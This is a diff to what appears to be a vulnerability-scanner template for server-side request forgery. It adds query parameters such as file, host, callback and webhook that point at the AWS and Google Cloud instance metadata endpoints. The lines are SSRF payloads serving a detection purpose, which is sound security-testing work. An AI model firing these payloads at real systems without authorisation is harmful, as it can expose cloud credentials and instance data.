@@ -29,10 +29,19 @@ http:
       - "{{BaseURL}}/?image=http://169.254.169.254/latest/meta-data/"
       - "{{BaseURL}}/?endpoint=http://169.254.169.254/latest/meta-data/"
       - "{{BaseURL}}/?proxy=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?file=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?host=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?path=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?u=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?link=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?callback=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?webhook=http://169.254.169.254/latest/meta-data/"
       - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/"
       - "{{BaseURL}}/?redirect=http://metadata.google.internal/computeMetadata/v1/"
       - "{{BaseURL}}/?fetch=http://metadata.google.internal/computeMetadata/v1/"
       - "{{BaseURL}}/?proxy=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?file=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?host=http://metadata.google.internal/computeMetadata/v1/"
     stop-at-first-match: true
     matchers-condition: and
     matchers:
